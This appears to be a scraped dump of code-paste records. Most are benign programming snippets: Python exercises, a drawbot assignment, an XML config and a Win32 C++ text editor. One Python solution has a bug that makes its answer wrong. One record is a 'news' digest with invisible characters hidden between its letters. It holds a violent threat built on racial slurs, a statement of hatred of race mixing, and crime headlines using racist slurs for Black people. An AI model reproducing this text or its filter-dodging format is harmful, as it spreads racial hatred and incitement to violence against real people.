            list.insert(Integer.parseInt(node));
        }

        list.bubbleSort();
        list.printDLL();
    }
}
"
QMM7fUp6,drawbot_Задание2,annstasi,Python,Sunday 3rd of December 2023 09:36:28 AM CDT,"from drawbot_skia.drawbot import *

# зададим правила для выбора
# фигуры, которые будем позже
# использовать:
rules = [1, 0, 1, 0, 2, 0, 1, ""гусь"", 3, 3] * 20
# список * 20
w, h = 742.5, 1050
newPage(w, h)

# определим поля и начальные
# координаты
margin = 80
x = margin
y = h - margin

# шаг = (ширина страницы - 2  поля (правое и левое)) / на 6 (6 фигур в строке)
step = (w - margin * 2) / 6

# создадим переменную size,
# равную выбранному шагу
size = step

for rule in rules:
    fill(0)
    stroke(None)
    # круг
    if rule == 0:
        oval(x, y - step, size, size)
    # квадрат
    elif rule == 1:
        rect(x, y - step, size, size)
    # окружность
    elif rule == 2:
        fill(None)
        stroke(0, 0, 0)
        strokeWidth(3)
        oval(x, y - step, size, size)
    # квадрат с красной рамкой
    elif rule == 3:
        fill(None)
        stroke(1, 0, 0)
        strokeWidth(3)
        rect(x, y - step, size, size)
    else:
        print(rule, ""<— неизвестное правило"")

    # сдвинем x на шаг
    x += step

    # если строка кончилась,
    # вернём x в начало, а
    # y сдвинем вниз на шаг
    if x >= w - margin:
        x = margin
        y -= step

    # если y дошёл до низа
    # страницы, создадим новую и
    # обнулим координаты
    if y - step < margin:
        newPage(w, h)
        x = margin
        y = h - margin

# сохраним pdf
saveImage(""summary_2_example.pdf"")


#############
# задание 1 #
#############

# перепишите последний пример
# так, чтобы в нём появилась
# обработка правила ""2"",
# рисующая контурный круг


##########################
# задание 2              #
# творческое, свободное  #
##########################

# можете использовать результат
# задания 1 как основу, или
# попробовать написать что-то
# новое
"
6WqXAAVE,vers,davidramos1,XML,Sunday 3rd of December 2023 09:30:33 AM CDT,"<?xml version=""1.0"" ?>
<launcher>
    <clientversion>1</clientversion>
	<clientsize>1000</clientsize>
    <clientname>Opostron</clientname>
</launcher>"
TDeLqf84,Untitled,Farz0l1x,Python,Sunday 3rd of December 2023 09:25:21 AM CDT,"from random import randint
A = [randint(1, 10000) for i in range(1000)]
Max  = -10**9
for i in range(len(A)):
    for j in range(i + 1, len(A)):
        if (A[i] * A[j]) % 350 == 0 and A[i] > A[j]:
            Max = max(Max, A[i] * A[j])
print(Max)"
1Z3q70z0,Untitled,Farz0l1x,Python,Sunday 3rd of December 2023 09:19:58 AM CDT,"from random import randint
A = [randint(1, 10000) for i in range(1000)]
Min  = 10**10
for i in range(len(A)):
    for j in range(i + 1, len(A)):
        if A[i] % 17 == 0 or A[j] % 17 == 0:
            Min = min(Min, A[i] + A[j])
print(Min)

a17 = []
a = []
for i in range(len(A)):
    if A[i] % 17 == 0:
        a17 += [A[i]]
    else:
        a += [A[i]]
a.sort()
a17.sort()
print(min(a17[0] + a[0], a17[0] + a17[1]))"
KRPSTRFE,wm_char,Delfigamer,C++,Sunday 3rd of December 2023 09:15:41 AM CDT,"#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#define _SCL_SECURE_NO_WARNINGS

#include <Windows.h>
#include <cstdio>
#include <utility>
#include <string>
#include <vector>

struct TextEdit {
    std::wstring buffer;
    int caret = 0;

    wchar_t const* Buffer() {
        return buffer.data();
    }

    int Length() {
        return buffer.size();
    }

    void NormalizeCaret() {
        if (caret < 0) {
            caret = 0;
        } else if (caret > Length()) {
            caret = buffer.size();
        }
    }

    void Insert(wchar_t ch) {
        NormalizeCaret();
        buffer.insert(caret, 1, ch);
        caret += 1;
    }

    void Insert(std::wstring const& str) {
        NormalizeCaret();
        if (!str.empty()) {
            buffer.insert(caret, str);
            caret += str.size();
        }
    }

    void EraseLeft() {
        NormalizeCaret();
        if (caret > 0) {
            buffer.erase(caret - 1, 1);
            caret -= 1;
        }
    }

    void EraseRight() {
        NormalizeCaret();
        if (caret < Length()) {
            buffer.erase(caret, 1);
        }
    }

    void MoveLeft() {
        if (caret > 0) {
            caret -= 1;
        }
    }

    void MoveRight() {
        if (caret < Length()) {
            caret += 1;
        }
    }

    void MoveHome() {
        caret = 0;
    }

    void MoveEnd() {
        caret = buffer.size();
    }
};

TextEdit Current;
HPEN CaretPen;

void WindowPaint(HWND hwnd) {
    RECT clientrect;
    GetClientRect(hwnd, &clientrect);
    SIZE wndsize = {clientrect.right - clientrect.left, clientrect.bottom - clientrect.top};

    PAINTSTRUCT ps;
    HDC wnddc = BeginPaint(hwnd, &ps);
    HBITMAP bitmap = CreateCompatibleBitmap(wnddc, wndsize.cx, wndsize.cy);
    HDC dc = CreateCompatibleDC(wnddc);
    SelectObject(dc, bitmap);

    RECT wndrect = {0, 0, wndsize.cx, wndsize.cy};
    HBRUSH brush = CreateSolidBrush(RGB(255, 255, 255));
    FillRect(dc, &wndrect, brush);

    TEXTMETRICW textmetric;
    GetTextMetricsW(dc, &textmetric);

    int currentx = textmetric.tmHeight;
    int currenty = textmetric.tmHeight;
    SIZE textsize;

    TextOutW(dc, currentx, currenty, Current.Buffer(), Current.Length());

    GetTextExtentPointW(dc, Current.Buffer(), Current.caret, &textsize);
    SelectObject(dc, CaretPen);
    MoveToEx(dc, currentx + textsize.cx, currenty, nullptr);
    LineTo(dc, currentx + textsize.cx, currenty + textmetric.tmHeight);

    BitBlt(wnddc, 0, 0, wndsize.cx, wndsize.cy, dc, 0, 0, SRCCOPY);
    DeleteObject(brush);
    DeleteDC(dc);
    DeleteObject(bitmap);
    EndPaint(hwnd, &ps);
}

LRESULT CALLBACK WindowProc(
    HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam
) {
    switch (uMsg) {
    case WM_CREATE:
        CaretPen = CreatePen(PS_SOLID, 0, RGB(0, 0, 0));
        return 0;
    case WM_DESTROY:
        DeleteObject(CaretPen);
        PostQuitMessage(0);
        return 0;
    case WM_CHAR:
        wprintf(L""WM_CHAR %#4llx'%lc' %3lli\n"", wParam, (wchar_t)wParam, (lParam >> 16) & 0xff);
        if (wParam == 8) {
            Current.EraseLeft();
        } else if (wParam >= 32) {
            Current.Insert(wParam);
        }
        InvalidateRect(hwnd, nullptr, false);
        return 0;
    case WM_KEYDOWN:
        wprintf(L""WM_KEYDOWN    %4lli %3lli\n"", wParam, (lParam >> 16) & 0xff);
        if (wParam == VK_LEFT) {
            Current.MoveLeft();
            InvalidateRect(hwnd, nullptr, false);
        } else if (wParam == VK_RIGHT) {
            Current.MoveRight();
            InvalidateRect(hwnd, nullptr, false);
        } else if (wParam == VK_HOME || wParam == VK_PRIOR || wParam == VK_UP) {
            Current.MoveHome();
            InvalidateRect(hwnd, nullptr, false);
        } else if (wParam == VK_END || wParam == VK_NEXT || wParam == VK_DOWN) {
            Current.MoveEnd();
            InvalidateRect(hwnd, nullptr, false);
        } else if (wParam == VK_DELETE) {
            Current.EraseRight();
            InvalidateRect(hwnd, nullptr, false);
        }
        return 0;
    case WM_KEYUP:
        return 0;
    case WM_PAINT:
        WindowPaint(hwnd);
        return 0;
    default:
        return DefWindowProcW(hwnd, uMsg, wParam, lParam);
    }
}

int CALLBACK WinMain(
    HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    AllocConsole();
    freopen(""CONOUT$"", ""w"", stdout);
    const DWORD WindowStyle = WS_OVERLAPPEDWINDOW;
    WNDCLASSW wndclass;
    wndclass.style = CS_VREDRAW | CS_HREDRAW;
    wndclass.lpfnWndProc = &WindowProc;
    wndclass.cbClsExtra = 8;
    wndclass.cbWndExtra = 0;
    wndclass.hInstance = hInstance;
    wndclass.hIcon = LoadIcon(0, IDI_APPLICATION);
    wndclass.hCursor = LoadCursor(0, IDC_ARROW);
    wndclass.hbrBackground = 0;
    wndclass.lpszMenuName = 0;
    wndclass.lpszClassName = L""MyWindowClass"";
    ATOM wndclassatom = RegisterClassW(&wndclass);
    RECT WindowRect = {0, 0, 800, 600};
    AdjustWindowRect(
        &WindowRect, WindowStyle, false);
    HWND hwnd = CreateWindowW(
        (LPCWSTR)wndclassatom,
        L""window"",
        WindowStyle,
        20,
        20,
        WindowRect.right - WindowRect.left,
        WindowRect.bottom - WindowRect.top,
        0,
        0,
        hInstance,
        0);
    ShowWindow(hwnd, SW_SHOW);
    UpdateWindow(hwnd);
    MSG message = {0, 0, 0, 0};
    while (GetMessageW(&message, nullptr, 0, 0)) {
        TranslateMessage(&message);
        DispatchMessageW(&message);
    }
    return 0;
};
"
jTXqd4FW,Untitled,Farz0l1x,Python,Sunday 3rd of December 2023 09:10:24 AM CDT,"from random import randint
A = [randint(1, 1000) for i in range(1000)]
Max = -10**9
for i in range(len(A)):
    for j in range(i + 1, len(A)):
        if (A[i] + A[j]) % 107 == 0:
            Max = max(Max, A[i] + A[j])
print(Max)

a = [[] for i in range(107)]
n = len(A)
for i in range(n):
    x = A[i]
    ost = x % 107
    a[ost] += [x]
b = []
for i in range(107):
    a[i].sort()
    b += a[i][-2:]
ans = []
for i in range(len(b)):
    for j in range(i + 1, len(b)):
        if (b[i] + b[j]) % 107 == 0:
            ans += [b[i] + b[j]]
print(max(ans))"
VcVCNGEV,Untitled,Farz0l1x,Python,Sunday 3rd of December 2023 08:58:31 AM CDT,"from random import randint
A = [randint(1, 1000) for i in range(1000)]
count = 0
for i in range(len(A)):
    for j in range(i + 1, len(A)):
        if (A[i] + A[j]) % 127 == 0:
            count += 1
print(count)

k = [0] * 127
n = len(A)
for i in range(n):
    ost = A[i] % 127
    k[ost] += 1
count = k[0] * (k[0] - 1) // 2
for i in range(1, 64):
    count += k[i] * k[127 - i]
print(count)"
aXrt8JGr,Untitled,Farz0l1x,Python,Sunday 3rd of December 2023 08:46:48 AM CDT,"from random import randint
A = [randint(1, 1000) for i in range(1000)]
count = 0
for i in range(len(A)):
    for j in range(i + 1, len(A)):
        if (A[i] * A[j]) % 15 == 0:
            count += 1
print(count)

k15 = 0
k5 = 0
k3 = 0
for i in range(len(A)):
    if A[i] % 15 == 0:
        k15 += 1
    elif A[i] % 5 == 0:
        k5 += 1
    elif A[i] % 3 == 0:
        k3 += 1
k = len(A) - k15
print(k * k15 + k3 * k5 + k15 * (k15 - 1) // 2)"
U6jgcWfs,Untitled,Farz0l1x,Python,Sunday 3rd of December 2023 08:38:41 AM CDT,"from random import randint
A = [randint(1, 100) for i in range(100)]
count = 0
for i in range(len(A)):
    for j in range(i + 1, len(A)):
        if (A[i] * A[j]) % 7 == 0:
            count += 1
print(count)

k7 = 0
for i in range(len(A)):
    if A[i] % 7 == 0:
        k7 += 1
k = len(A) - 7
print(k * k7 + k7 * (k7 - 1) // 2)"
iyzregsG,News Dec3 23,Newscaster_Ned,Email,Sunday 3rd of December 2023 08:32:12 AM CDT,".‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎.‎

N‎e‎w‎s‎c‎a‎s‎t‎e‎r‎ ‎N‎e‎d‎ ‎h‎e‎r‎e‎ ‎j‎u‎s‎t‎ ‎t‎e‎l‎l‎i‎n‎g‎ ‎y‎o‎u‎ ‎I‎ ‎h‎a‎t‎e‎ ‎D‎r‎.‎ ‎N‎i‎g‎g‎e‎r‎ ‎P‎e‎n‎i‎s‎!‎ ‎I‎ ‎w‎a‎n‎t‎ ‎t‎o‎ ‎c‎h‎o‎p‎ ‎o‎f‎f‎ ‎h‎i‎s‎ ‎n‎i‎g‎g‎e‎r‎ ‎p‎e‎n‎i‎s‎!‎

W‎o‎k‎e‎ ‎P‎o‎p‎e‎ ‎B‎l‎a‎m‎e‎s‎ ‎G‎r‎e‎e‎d‎y‎ ‎C‎a‎p‎i‎t‎a‎l‎i‎s‎t‎s‎ ‎f‎o‎r‎ ‎G‎l‎o‎b‎a‎l‎ ‎W‎a‎r‎m‎i‎n‎g‎ ‎a‎t‎ ‎C‎O‎P‎2‎8‎

C‎l‎i‎m‎a‎t‎e‎ ‎H‎a‎s‎ ‎‘‎R‎u‎n‎ ‎A‎m‎o‎k‎,‎’‎ ‎P‎l‎a‎n‎e‎t‎ ‎‘‎O‎v‎e‎r‎h‎e‎a‎t‎i‎n‎g‎’‎
P‎o‎p‎e‎ ‎F‎r‎a‎n‎c‎i‎s‎
P‎o‎p‎e‎ ‎F‎r‎a‎n‎c‎i‎s‎ ‎s‎e‎n‎t‎ ‎a‎ ‎m‎e‎s‎s‎a‎g‎e‎ ‎S‎a‎t‎u‎r‎d‎a‎y‎ ‎t‎o‎ ‎t‎h‎e‎ ‎C‎O‎P‎2‎8‎ ‎U‎.‎N‎.‎ ‎c‎l‎i‎m‎a‎t‎e‎ ‎s‎u‎m‎m‎i‎t‎ ‎d‎e‎c‎r‎y‎i‎n‎g‎ ‎t‎h‎e‎ ‎“‎u‎n‎b‎r‎i‎d‎l‎e‎d‎ ‎e‎x‎p‎l‎o‎i‎t‎a‎t‎i‎o‎n‎”‎ ‎o‎f‎ ‎t‎h‎e‎ ‎e‎n‎v‎i‎r‎o‎n‎m‎e‎n‎t‎ ‎b‎y‎ ‎f‎i‎r‎s‎t‎ ‎w‎o‎r‎l‎d‎ ‎n‎a‎t‎i‎o‎n‎s‎.‎

L‎e‎f‎t‎i‎s‎t‎ ‎G‎e‎o‎r‎g‎e‎ ‎S‎o‎r‎o‎s‎ ‎a‎n‎d‎ ‎S‎o‎n‎ ‎M‎a‎x‎i‎m‎i‎z‎e‎ ‎D‎o‎n‎a‎t‎i‎o‎n‎s‎ ‎t‎o‎ ‎J‎o‎e‎ ‎B‎i‎d‎e‎n‎'‎s‎ ‎C‎a‎m‎p‎a‎i‎g‎n‎
L‎e‎f‎t‎i‎s‎t‎ ‎G‎e‎o‎r‎g‎e‎ ‎S‎o‎r‎o‎s‎ ‎a‎n‎d‎ ‎S‎o‎n‎ ‎M‎a‎x‎i‎m‎i‎z‎e‎ ‎D‎o‎n‎a‎t‎i‎o‎n‎s‎ ‎t‎o‎ ‎J‎o‎e‎ ‎B‎i‎d‎e‎n‎'‎s‎ ‎C‎a‎m‎p‎a‎i‎g‎n‎
1‎,‎7‎8‎1‎
P‎o‎p‎e‎ ‎F‎r‎a‎n‎c‎i‎s‎:‎ ‎C‎l‎i‎m‎a‎t‎e‎ ‎H‎a‎s‎ ‎‘‎R‎u‎n‎ ‎A‎m‎o‎k‎,‎’‎ ‎P‎l‎a‎n‎e‎t‎ ‎‘‎O‎v‎e‎r‎h‎e‎a‎t‎i‎n‎g‎’‎
P‎o‎p‎e‎ ‎F‎r‎a‎n‎c‎i‎s‎:‎ ‎C‎l‎i‎m‎a‎t‎e‎ ‎H‎a‎s‎ ‎‘‎R‎u‎n‎ ‎A‎m‎o‎k‎,‎’‎ ‎P‎l‎a‎n‎e‎t‎ ‎‘‎O‎v‎e‎r‎h‎e‎a‎t‎i‎n‎g‎’‎
5‎,‎7‎1‎8‎
P‎a‎r‎i‎s‎ ‎T‎e‎r‎r‎o‎r‎ ‎A‎t‎t‎a‎c‎k‎:‎ ‎O‎n‎e‎ ‎K‎i‎l‎l‎e‎d‎,‎ ‎T‎w‎o‎ ‎I‎n‎j‎u‎r‎e‎d‎ ‎b‎y‎ ‎'‎A‎l‎l‎a‎h‎u‎ ‎A‎k‎b‎a‎r‎'‎ ‎K‎n‎i‎f‎e‎m‎a‎n‎
P‎a‎r‎i‎s‎ ‎T‎e‎r‎r‎o‎r‎ ‎A‎t‎t‎a‎c‎k‎:‎ ‎O‎n‎e‎ ‎K‎i‎l‎l‎e‎d‎,‎ ‎T‎w‎o‎ ‎I‎n‎j‎u‎r‎e‎d‎ ‎b‎y‎ ‎'‎A‎l‎l‎a‎h‎u‎ ‎A‎k‎b‎a‎r‎'‎ ‎K‎n‎i‎f‎e‎m‎a‎n‎
7‎8‎8‎
B‎u‎d‎ ‎L‎i‎g‎h‎t‎ ‎T‎r‎i‎e‎s‎ ‎t‎o‎ ‎D‎i‎s‎t‎a‎n‎c‎e‎ ‎I‎t‎s‎e‎l‎f‎ ‎f‎r‎o‎m‎ ‎D‎y‎l‎a‎n‎ ‎M‎u‎l‎v‎a‎n‎e‎y‎ ‎D‎i‎s‎a‎s‎t‎e‎r‎ ‎w‎i‎t‎h‎ ‎N‎e‎w‎ ‎A‎d‎
B‎u‎d‎ ‎L‎i‎g‎h‎t‎ ‎T‎r‎i‎e‎s‎ ‎t‎o‎ ‎D‎i‎s‎t‎a‎n‎c‎e‎ ‎I‎t‎s‎e‎l‎f‎ ‎f‎r‎o‎m‎ ‎D‎y‎l‎a‎n‎ ‎M‎u‎l‎v‎a‎n‎e‎y‎ ‎D‎i‎s‎a‎s‎t‎e‎r‎ ‎w‎i‎t‎h‎ ‎N‎e‎w‎ ‎A‎d‎
5‎6‎8‎
M‎a‎h‎e‎r‎:‎ ‎D‎e‎m‎ ‎S‎t‎a‎f‎f‎e‎r‎s‎ ‎P‎r‎o‎t‎e‎s‎t‎i‎n‎g‎ ‎f‎o‎r‎ ‎H‎a‎m‎a‎s‎ ‎B‎e‎c‎a‎u‎s‎e‎ ‎S‎c‎h‎o‎o‎l‎s‎ ‎A‎r‎e‎ ‎A‎n‎t‎i‎-‎A‎m‎e‎r‎i‎c‎a‎
M‎a‎h‎e‎r‎:‎ ‎D‎e‎m‎ ‎S‎t‎a‎f‎f‎e‎r‎s‎ ‎P‎r‎o‎t‎e‎s‎t‎i‎n‎g‎ ‎f‎o‎r‎ ‎H‎a‎m‎a‎s‎ ‎B‎e‎c‎a‎u‎s‎e‎ ‎S‎c‎h‎o‎o‎l‎s‎ ‎A‎r‎e‎ ‎A‎n‎t‎i‎-‎A‎m‎e‎r‎i‎c‎a‎
6‎0‎2‎
I‎l‎l‎e‎g‎a‎l‎ ‎M‎i‎g‎r‎a‎n‎t‎s‎ ‎I‎n‎v‎a‎d‎e‎ ‎E‎l‎i‎t‎e‎ ‎P‎l‎a‎y‎g‎r‎o‎u‎n‎d‎ ‎i‎n‎ ‎M‎a‎l‎i‎b‎u‎
I‎l‎l‎e‎g‎a‎l‎ ‎M‎i‎g‎r‎a‎n‎t‎s‎ ‎I‎n‎v‎a‎d‎e‎ ‎E‎l‎i‎t‎e‎ ‎P‎l‎a‎y‎g‎r‎o‎u‎n‎d‎ ‎i‎n‎ ‎M‎a‎l‎i‎b‎u‎
4‎,‎2‎3‎2‎
W‎i‎d‎o‎w‎e‎r‎ ‎o‎f‎ ‎N‎e‎w‎ ‎O‎r‎l‎e‎a‎n‎s‎ ‎W‎o‎m‎a‎n‎,‎ ‎7‎3‎,‎ ‎K‎i‎l‎l‎e‎d‎ ‎i‎n‎ ‎C‎a‎r‎j‎a‎c‎k‎i‎n‎g‎ ‎S‎u‎e‎s‎ ‎T‎e‎e‎n‎s‎'‎ ‎P‎a‎r‎e‎n‎t‎s‎
W‎i‎d‎o‎w‎e‎r‎ ‎o‎f‎ ‎N‎e‎w‎ ‎O‎r‎l‎e‎a‎n‎s‎ ‎W‎o‎m‎a‎n‎,‎ ‎7‎3‎,‎ ‎K‎i‎l‎l‎e‎d‎ ‎i‎n‎ ‎C‎a‎r‎j‎a‎c‎k‎i‎n‎g‎ ‎S‎u‎e‎s‎ ‎T‎e‎e‎n‎s‎'‎ ‎P‎a‎r‎e‎n‎t‎s‎
6‎3‎1‎

W‎A‎T‎C‎H‎:‎ ‎F‎a‎i‎t‎h‎ ‎L‎e‎a‎d‎e‎r‎s‎ ‎P‎r‎a‎y‎ ‎o‎v‎e‎r‎ ‎D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎ ‎i‎n‎ ‎I‎o‎w‎a‎
3‎,‎0‎0‎8‎
W‎h‎i‎t‎e‎ ‎H‎o‎u‎s‎e‎:‎ ‎I‎s‎r‎a‎e‎l‎ ‎C‎a‎n‎'‎t‎ ‎O‎p‎e‎r‎a‎t‎e‎ ‎i‎n‎ ‎S‎o‎u‎t‎h‎ ‎U‎n‎t‎i‎l‎ ‎t‎h‎e‎y‎ ‎C‎o‎n‎s‎i‎d‎e‎r‎ ‎C‎i‎v‎i‎l‎i‎a‎n‎s‎
W‎h‎i‎t‎e‎ ‎H‎o‎u‎s‎e‎:‎ ‎I‎s‎r‎a‎e‎l‎ ‎C‎a‎n‎'‎t‎ ‎O‎p‎e‎r‎a‎t‎e‎ ‎i‎n‎ ‎S‎o‎u‎t‎h‎ ‎U‎n‎t‎i‎l‎ ‎t‎h‎e‎y‎ ‎C‎o‎n‎s‎i‎d‎e‎r‎ ‎C‎i‎v‎i‎l‎i‎a‎n‎s‎
4‎,‎4‎4‎2‎
K‎a‎m‎a‎l‎a‎ ‎H‎a‎r‎r‎i‎s‎ ‎P‎l‎e‎a‎d‎s‎ ‎'‎W‎e‎ ‎H‎a‎v‎e‎ ‎t‎o‎ ‎R‎e‎v‎i‎t‎a‎l‎i‎z‎e‎ ‎t‎h‎e‎ ‎P‎a‎l‎e‎s‎t‎i‎n‎i‎a‎n‎ ‎A‎u‎t‎h‎o‎r‎i‎t‎y‎'‎
K‎a‎m‎a‎l‎a‎ ‎H‎a‎r‎r‎i‎s‎ ‎P‎l‎e‎a‎d‎s‎ ‎'‎W‎e‎ ‎H‎a‎v‎e‎ ‎t‎o‎ ‎R‎e‎v‎i‎t‎a‎l‎i‎z‎e‎ ‎t‎h‎e‎ ‎P‎a‎l‎e‎s‎t‎i‎n‎i‎a‎n‎ ‎A‎u‎t‎h‎o‎r‎i‎t‎y‎'‎

M‎a‎n‎d‎i‎n‎g‎o‎ ‎G‎e‎t‎s‎ ‎3‎0‎ ‎Y‎e‎a‎r‎s‎ ‎A‎f‎t‎e‎r‎ ‎B‎e‎a‎t‎i‎n‎g‎ ‎H‎i‎s‎ ‎M‎u‎d‎s‎h‎a‎r‎k‎ ‎G‎i‎r‎l‎f‎r‎i‎e‎n‎d‎'‎s‎ ‎3‎-‎Y‎e‎a‎r‎-‎O‎l‎d‎ ‎W‎h‎i‎t‎e‎ ‎S‎o‎n‎ ‎t‎o‎ ‎D‎e‎a‎t‎h‎.‎

J‎u‎s‎t‎ ‎f‎u‎c‎k‎i‎n‎g‎ ‎d‎i‎s‎g‎u‎s‎t‎i‎n‎g‎.‎ ‎I‎ ‎h‎a‎t‎e‎ ‎r‎a‎c‎e‎ ‎m‎i‎x‎i‎n‎g‎.‎


M‎u‎d‎s‎h‎a‎r‎k‎ ‎S‎e‎n‎t‎ ‎t‎o‎ ‎P‎r‎i‎s‎o‎n‎ ‎A‎f‎t‎e‎r‎ ‎B‎e‎a‎t‎i‎n‎g‎ ‎H‎e‎r‎ ‎H‎a‎l‎f‎-‎C‎a‎s‎t‎e‎ ‎t‎o‎ ‎D‎e‎a‎t‎h‎ ‎i‎n‎ ‎S‎h‎i‎a‎w‎a‎s‎s‎e‎e‎ ‎C‎o‎u‎n‎t‎y‎.‎


C‎o‎o‎n‎ ‎R‎a‎p‎e‎s‎ ‎3‎ ‎T‎e‎e‎n‎a‎g‎e‎ ‎G‎i‎r‎l‎s‎ ‎a‎t‎ ‎R‎T‎A‎ ‎B‎u‎s‎ ‎S‎t‎o‎p‎ ‎i‎n‎ ‎ ‎C‎l‎e‎v‎e‎l‎a‎n‎d‎.‎


L‎i‎t‎t‎l‎e‎ ‎R‎o‎c‎k‎ ‎S‎p‎o‎o‎k‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎I‎m‎p‎r‎e‎g‎n‎a‎t‎i‎n‎g‎ ‎1‎3‎-‎Y‎e‎a‎r‎-‎O‎l‎d‎ ‎G‎i‎r‎l‎.‎


F‎a‎i‎r‎f‎i‎e‎l‎d‎ ‎G‎h‎e‎t‎t‎o‎ ‎L‎o‎b‎s‎t‎e‎r‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎P‎i‎m‎p‎i‎n‎g‎ ‎1‎6‎-‎Y‎e‎a‎r‎-‎O‎l‎d‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎a‎t‎h‎e‎r‎.‎

S‎u‎n‎ ‎0‎3‎ ‎|‎ ‎D‎a‎y‎
7‎5‎°‎
S‎W‎
1‎2‎
 ‎
m‎p‎h‎
M‎o‎s‎t‎l‎y‎ ‎s‎u‎n‎n‎y‎.‎ ‎H‎i‎g‎h‎ ‎n‎e‎a‎r‎ ‎7‎5‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎W‎ ‎a‎t‎ ‎1‎0‎ ‎t‎o‎ ‎1‎5‎ ‎m‎p‎h‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
3‎7‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
4‎ ‎o‎f‎ ‎1‎1‎
S‎u‎n‎r‎i‎s‎e‎
7‎:‎0‎9‎ ‎a‎m‎
S‎u‎n‎s‎e‎t‎
5‎:‎3‎0‎ ‎p‎m‎
S‎u‎n‎ ‎0‎3‎ ‎|‎ ‎N‎i‎g‎h‎t‎
4‎7‎°‎
W‎S‎W‎
8‎
 ‎
m‎p‎h‎
C‎l‎e‎a‎r‎ ‎s‎k‎i‎e‎s‎.‎ ‎L‎o‎w‎ ‎4‎7‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎W‎S‎W‎ ‎a‎t‎ ‎5‎ ‎t‎o‎ ‎1‎0‎ ‎m‎p‎h‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
5‎8‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
1‎1‎:‎2‎1‎ ‎p‎m‎
W‎a‎n‎i‎n‎g‎ ‎G‎i‎b‎b‎o‎u‎s‎
M‎o‎o‎n‎s‎e‎t‎
1‎2‎:‎1‎7‎ ‎p‎m‎
M‎o‎n‎ ‎0‎4‎
S‎u‎n‎n‎y‎
7‎0‎°‎
/‎4‎0‎°‎
0‎%‎
N‎E‎ ‎1‎1‎ ‎m‎p‎h‎
T‎u‎e‎ ‎0‎5‎
S‎u‎n‎n‎y‎
7‎2‎°‎
/‎4‎5‎°‎
3‎%‎
N‎E‎ ‎4‎ ‎m‎p‎h‎
W‎e‎d‎ ‎0‎6‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎0‎°‎
/‎5‎0‎°‎
5‎%‎
E‎ ‎6‎ ‎m‎p‎h‎
T‎h‎u‎ ‎0‎7‎
A‎M‎ ‎C‎l‎o‎u‎d‎s‎/‎P‎M‎ ‎S‎u‎n‎
7‎3‎°‎
/‎6‎1‎°‎
7‎%‎
S‎ ‎1‎3‎ ‎m‎p‎h‎
F‎r‎i‎ ‎0‎8‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎0‎°‎
/‎6‎0‎°‎
1‎8‎%‎
S‎S‎W‎ ‎1‎5‎ ‎m‎p‎h‎
S‎a‎t‎ ‎0‎9‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎6‎°‎
/‎4‎6‎°‎
1‎7‎%‎
N‎W‎ ‎1‎6‎ ‎m‎p‎h‎
S‎u‎n‎ ‎1‎0‎
S‎u‎n‎n‎y‎
6‎2‎°‎
/‎4‎1‎°‎
2‎2‎%‎
N‎N‎W‎ ‎1‎2‎ ‎m‎p‎h‎
M‎o‎n‎ ‎1‎1‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎4‎°‎
/‎4‎8‎°‎
6‎%‎
S‎ ‎1‎1‎ ‎m‎p‎h‎
T‎u‎e‎ ‎1‎2‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎2‎°‎
/‎4‎7‎°‎
2‎4‎%‎
N‎E‎ ‎1‎1‎ ‎m‎p‎h‎
W‎e‎d‎ ‎1‎3‎
A‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
6‎3‎°‎
/‎4‎7‎°‎
4‎4‎%‎
N‎E‎ ‎9‎ ‎m‎p‎h‎
T‎h‎u‎ ‎1‎4‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎3‎°‎
/‎4‎8‎°‎
2‎3‎%‎
N‎E‎ ‎8‎ ‎m‎p‎h‎
F‎r‎i‎ ‎1‎5‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎3‎°‎
/‎4‎7‎°‎
2‎4‎%‎
N‎N‎E‎ ‎9‎ ‎m‎p‎h‎
S‎a‎t‎ ‎1‎6‎
A‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
6‎3‎°‎
/‎4‎9‎°‎
3‎5‎%‎
E‎N‎E‎ ‎9‎ ‎m‎p‎h‎
S‎u‎n‎ ‎1‎7‎
